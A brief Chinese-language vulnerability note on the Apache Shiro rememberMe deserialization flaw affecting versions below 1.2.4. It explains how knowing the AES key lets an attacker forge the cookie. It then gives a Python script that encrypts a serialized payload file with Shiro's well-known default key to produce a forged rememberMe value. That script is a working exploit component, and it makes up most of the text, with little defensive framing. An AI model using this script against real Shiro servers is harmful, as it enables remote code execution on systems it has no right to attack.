漏洞信息


Apache Shiro是Java的一个安全框架，旨在简化身份验证和授权。Shiro在JavaSE和JavaEE项目中都可以使用。它主要用来处理身份认证，授权，企业会话管理和加密等。

将cookie的信息序列化并用AES加密之后base64编码存储在RememberMe的Cookie值，在下次请求时会读取 Cookie 中的 rememberMe字段并且进行解密然后反序列化当我们知道了AES加密的key时就可以伪造rememberMe触发反序列化漏洞


版本
Apache Shiro < 1.2.4

import uuidimport base64from Crypto.Cipher import AES
def get_file(filename):    with open(filename,'rb') as a:        data = a.read()    return data
def AES_en(data):    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    ciintext = base64.b64encode(iv + encryptor.encrypt(pad(data)))    return ciintext
data = get_file("print.bin")print(AES_en(data))
